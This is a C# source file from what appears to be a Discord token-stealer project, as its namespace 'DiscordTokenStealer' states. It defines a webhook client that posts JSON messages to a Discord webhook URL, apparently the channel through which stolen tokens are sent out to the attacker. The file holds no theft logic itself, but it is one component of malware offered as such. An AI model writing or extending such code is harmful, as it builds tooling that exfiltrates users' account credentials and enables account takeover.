using System.Net;
using System.Net.Http.Json;

namespace DiscordTokenStealer.Discord;

public partial class DiscordWebhookClient
{
    public async Task SendMessage<TMessage>(TMessage message) where TMessage : DiscordMessage
    {
        using var response = await _client.PostAsync($"{_id}/{_token}", JsonContent.Create(message));
        response.EnsureSuccessStatusCode();
    }
}

public partial class DiscordWebhookClient : IDisposable
{
    private readonly HttpClient _client;

    private readonly string _id;
    
    private readonly string _token;

    public DiscordWebhookClient(string id, string token)
    {
        _id = id;
        _token = token;
        _client = new HttpClient(new HttpClientHandler(), true)
        {
            BaseAddress = new Uri("https://canary.discord.com/api/webhooks/")
        };
    }

    public void Dispose()
    {
        _client.Dispose();
        GC.SuppressFinalize(this);
    }
}